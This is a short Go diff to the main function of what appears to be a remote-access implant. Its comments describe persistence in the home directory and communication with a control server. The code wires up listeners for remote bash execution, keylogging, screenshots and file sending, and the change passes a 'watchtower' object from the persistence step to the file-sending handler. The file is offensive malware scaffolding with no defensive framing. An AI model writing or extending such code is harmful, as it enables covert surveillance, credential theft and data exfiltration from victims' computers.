@@ -9,7 +9,7 @@ func main() {
 	// Deploy for persistence
 	// this setups home directory folder for the program
 	// folder strcuture & persist mechanism
-	internal.Deploy()
+	watchtower := internal.Deploy()
 
 	// ===========================================================================
 	// Start connection and communication with server
@@ -32,7 +32,7 @@ func main() {
 	subject.AddListener(internal.NewBashExecutorObserver())
 	subject.AddListener(internal.NewKeyloggerCmdObserver())
 	subject.AddListener(internal.NewScreenshotCmdObserver(screenrecorder, sendFileCmd))
-	subject.AddListener(internal.NewSendFileCmdObserver(sendFileCmd))
+	subject.AddListener(internal.NewSendFileCmdObserver(sendFileCmd, watchtower))
 
 	// Start Communications
 	wsc.StartCommunications(subject)
